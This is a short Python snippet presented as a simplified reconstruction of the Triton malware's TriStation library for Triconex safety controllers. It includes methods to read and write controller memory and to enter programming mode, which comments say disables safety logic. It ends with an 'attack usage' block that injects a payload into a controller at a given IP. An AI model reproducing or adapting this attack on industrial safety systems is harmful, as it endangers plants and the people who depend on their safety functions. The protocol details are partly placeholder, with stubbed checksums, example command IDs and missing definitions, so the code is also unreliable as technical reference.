# Simplified reconstruction of Triton's TriStation library

class TriStation:
    def __init__(self, ip, port=1502):
        self.ip = ip
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self.sock.connect((self.ip, self.port))

    def ts_exec(self, command_id, data=b''):
        """
        Execute TriStation command
        """
        # Packet structure: [Header][Command ID][Data Length][Data][CRC]
        header = b'\x00\x00'
        cmd = struct.pack('>H', command_id)
        length = struct.pack('>H', len(data))
        crc = self.calculate_crc(cmd + length + data)

        packet = header + cmd + length + data + crc
        self.sock.send(packet)

        response = self.sock.recv(4096)
        return self.parse_response(response)

    def read_memory(self, address, length):
        """
        Read controller memory
        """
        cmd = 0x03  # Read command (example)
        data = struct.pack('>II', address, length)
        return self.ts_exec(cmd, data)

    def write_memory(self, address, payload):
        """
        Write to controller memory (inject malicious code)
        """
        cmd = 0x04  # Write command
        data = struct.pack('>I', address) + payload
        return self.ts_exec(cmd, data)

    def enter_programming_mode(self):
        """
        Put SIS controller in programming mode (disables safety logic)
        """
        cmd = 0x10  # Program mode command
        return self.ts_exec(cmd)

    def calculate_crc(self, data):
        # CRC-16 or proprietary checksum
        return b'\x00\x00'  # Simplified

# Triton attack usage:
ts = TriStation('192.168.1.10')
ts.connect()
ts.enter_programming_mode()  # Disable safety functions
ts.write_memory(0x8000, malicious_payload)  # Inject backdoor
